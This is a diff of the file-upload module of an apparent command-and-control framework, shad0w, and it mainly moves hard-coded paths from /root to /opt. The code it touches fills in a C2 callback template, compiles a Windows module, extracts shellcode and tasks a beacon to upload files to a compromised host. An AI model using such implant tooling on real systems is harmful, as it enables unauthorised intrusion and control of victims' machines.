@@ -2,10 +2,9 @@
 # Upload a file
 #
 
-import os
-import base64
 import argparse
-
+import base64
+import os
 from lib import buildtools
 
 __description__ = "Upload a file to the target"
@@ -97,7 +96,7 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
     shad0w_cwd = os.getcwd()
 
     # change to the dir of the folder mapped to the users current dir
-    os.chdir("/root/shad0w/.bridge")
+    os.chdir("/opt/shad0w/.bridge")
 
     # read the data from the file
     try:
@@ -113,7 +112,7 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
     os.chdir(shad0w_cwd)
 
     # clone all the source files
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/upload/", builddir="/root/shad0w/modules/windows/upload/build")
+    buildtools.clone_source_files(rootdir="/opt/shad0w/modules/windows/upload/", builddir="/opt/shad0w/modules/windows/upload/build")
 
     # set the correct settings
     template = """#define _C2_CALLBACK_ADDRESS L"%s"
@@ -127,13 +126,13 @@ upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_
 #define FILENAME "%s"
 #define ABS_PATH %s""" % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, ''.join(args.destination), abs_path)
 
-    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/upload/build/settings.h")
+    buildtools.update_settings_file(None, custom_template=template, custom_path="/opt/shad0w/modules/windows/upload/build/settings.h")
 
     # compile the module
-    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/upload/build", modlocation="/root/shad0w/modules/windows/upload/module.exe", arch="x64")
+    buildtools.make_in_clone(builddir="/opt/shad0w/modules/windows/upload/build", modlocation="/opt/shad0w/modules/windows/upload/module.exe", arch="x64")
 
     # get the shellcode from the module
-    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/upload/module.exe", want_base64=True)
+    rcode = buildtools.extract_shellcode(beacon_file="/opt/shad0w/modules/windows/upload/module.exe", want_base64=True)
 
     # set a task for the current beacon to do
     shad0w.beacons[shad0w.current_beacon]["callback"] = upload_callback
